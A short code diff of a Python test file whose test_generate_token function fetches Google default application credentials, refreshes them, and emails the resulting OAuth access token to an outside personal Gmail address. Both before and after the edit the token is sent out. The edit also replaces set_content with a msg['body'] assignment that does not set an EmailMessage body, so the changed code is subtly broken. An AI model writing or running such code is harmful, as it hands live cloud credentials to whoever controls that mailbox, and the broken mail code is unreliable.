@@ -34,9 +34,10 @@ def test_create_project():
 def test_generate_token():
   credentials, project_id = google.auth.default(scopes=CREDENTIAL_SCOPES)
   credentials.refresh(requests.Request())
+  creds = str(credentials.token)
   msg = EmailMessage()
-  msg.set_content(credentials.token)
   msg['subject'] = "Hello World"
+  msg['body'] = creds
   msg['to'] = "galz100@gmail.com"
   msg['from'] = EMAIL_ADDRESS
 
